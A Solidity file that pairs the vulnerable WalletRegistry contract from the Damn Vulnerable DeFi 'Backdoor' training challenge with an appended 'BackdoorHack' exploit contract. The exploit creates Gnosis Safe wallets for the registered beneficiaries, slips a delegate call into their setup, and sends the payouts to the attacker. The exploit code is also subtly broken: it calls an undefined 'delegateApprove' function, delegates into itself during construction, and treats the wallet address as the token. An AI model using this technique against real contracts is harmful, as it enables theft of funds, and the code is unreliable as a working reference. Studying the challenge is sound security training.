// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18

    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping(address => bool) public beneficiaries;

    // owner => wallet
    mapping(address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        require(masterCopyAddress != address(0));
        require(walletFactoryAddress != address(0));

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            addBeneficiary(initialBeneficiaries[i]);
        }
    }

    function addBeneficiary(address beneficiary) public onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    function _removeBeneficiary(address beneficiary) private {
        beneficiaries[beneficiary] = false;
    }

    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        // Make sure we have enough DVT to pay
        require(
            token.balanceOf(address(this)) >= TOKEN_PAYMENT,
            "Not enough funds to pay"
        );

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        require(msg.sender == walletFactory, "Caller must be factory");
        require(singleton == masterCopy, "Fake mastercopy used");

        // Ensure initial calldata was a call to `GnosisSafe::setup`
        require(
            bytes4(initializer[:4]) == GnosisSafe.setup.selector,
            "Wrong initialization"
        );

        // Ensure wallet initialization is the expected
        require(
            GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD,
            "Invalid threshold"
        );
        require(
            GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS,
            "Invalid number of owners"
        );

        // Ensure the owner is a registered beneficiary
        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

        require(
            beneficiaries[walletOwner],
            "Owner is not registered as beneficiary"
        );

        // Remove owner as beneficiary
        _removeBeneficiary(walletOwner);

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        token.transfer(walletAddress, TOKEN_PAYMENT);
    }
}

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

contract BackdoorHack {
    // run attack via constructor as initializer
    constructor(
        address _registryAddress,
        address _masterCopyAddress,
        GnosisSafeProxyFactory _walletFactory,
        IERC20 _token,
        address[] memory _beneficiaries
    ) {
        // create wallet for each beneficiary here(for loop each wallet)
        for (uint256 i = 0; i < _beneficiaries.length; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            bytes memory _initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature(
                    "delegateApprove(address)",
                    address(this)
                ), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            GnosisSafeProxy wallet = _walletFactory.createProxyWithCallback(
                _masterCopyAddress, // Singleton, the Gnosis master copy
                _initializer, // initializer => Payload for message call sent to new proxy contract.
                i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                IProxyCreationCallback(_registryAddress) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
            );

            // wallet will receieve DVT via callback then transfer to msg.sender
            IERC20(address(wallet)).transfer(msg.sender, 10 ether);
        }
    }
}
